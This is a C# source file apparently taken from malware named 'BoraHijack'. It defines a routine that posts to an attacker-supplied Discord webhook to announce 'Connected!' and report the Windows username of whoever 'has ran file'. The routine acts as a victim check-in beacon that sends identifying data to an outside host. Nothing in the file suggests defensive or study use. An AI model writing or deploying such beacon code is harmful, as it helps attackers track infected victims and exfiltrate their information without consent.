using Discord.Webhook;
using Discord;
using System.Threading.Tasks;
using System;

namespace BoraHijack.Common
{
    public class Confirm
    {
        public static async Task Confirming(string webhookUrl)
        {
            var client = new DiscordWebhookClient(webhookUrl);
            await client.SendMessageAsync(
                text: "",
                username: "BoraHijack",
                avatarUrl: "https://files.catbox.moe/zteeqk.png",
                isTTS: false,
                embeds: new[] { new EmbedBuilder().WithTitle("Connected!").WithDescription($"**{Environment.UserName}** has ran file").WithFooter("Made by vanity (v1s0or)").Build() }
            );
        }
    }
}

